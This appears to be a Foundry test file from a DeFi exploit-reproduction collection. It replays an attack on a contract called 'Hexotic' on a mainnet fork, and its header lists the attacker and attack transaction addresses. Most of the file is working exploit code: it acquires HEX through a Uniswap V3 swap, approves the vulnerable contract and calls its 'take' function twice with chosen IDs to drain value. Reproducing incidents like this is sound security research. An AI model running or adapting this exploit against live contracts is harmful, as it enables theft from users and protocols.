// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 500 USD
// Attacker : https://etherscan.io/address/0x07185a9e74f8dceb7d6487400e4009ff76d1af46
// Attack Contract : https://etherscan.io/address/0x6e0113c4f1de65b98381baa6443b20834b70d4c5
// Vulnerable Contract : https://arbiscan.io/address/0x03339ecae41bc162dacae5c2a275c8f64d6c80a0
// Attack Tx : https://etherscan.io/tx/0x23b69bef57656f493548a5373300f7557777f352ade8131353ff87a1b27e2bb3

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x03339ecae41bc162dacae5c2a275c8f64d6c80a0#code

// @Analysis
// Post-mortem : https://t.me/defimon_alerts/1757
// Twitter Guy : N/A
// Hacking God : N/A

interface IHexotic {
    function take(bytes32 id) external payable;
}

contract Hex is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 23260641 - 1;

    //address
    address constant uniswapV3HEXPool = 0x9e0905249CeEFfFB9605E034b534544684A58BE6;
    IWETH constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant hexToken = IERC20(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39);
    // The address of the vulnerable 'Hexotic' contract.
    IHexotic hexotic = IHexotic(0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1);
    
    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //// Fund the test contract with 0.1 ETH to pay for gas and initial transactions.
        vm.deal(address(this), 0.1 ether);
        WETH.deposit{value: 0.037 ether}();
        
        // Initiate a flash swap on the HEX Uniswap V3 Pool.
        IPancakeV3Pool(uniswapV3HEXPool).swap(address(this),false,37000000000000000,1461446703485210103287273052203988822378723970341,"0x00");

        hexToken.approve(address(hexotic), type(uint256).max);
        
        // Call the 'take' function on the vulnerable contract twice with specific IDs.
        // This is the core of the exploit. It leverages a vulnerability in the 'hexotic' contract
        // using the flash-loaned HEX tokens to extract value.
        hexotic.take(0x0000000000000000000000000000000000000000000000000000000000000043);
        hexotic.take(0x000000000000000000000000000000000000000000000000000000000000002b);    
    }
    receive() external payable {}

     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata /*_data*/) external {
        WETH.transfer(address(uniswapV3HEXPool), 37000000000000000);
    }
}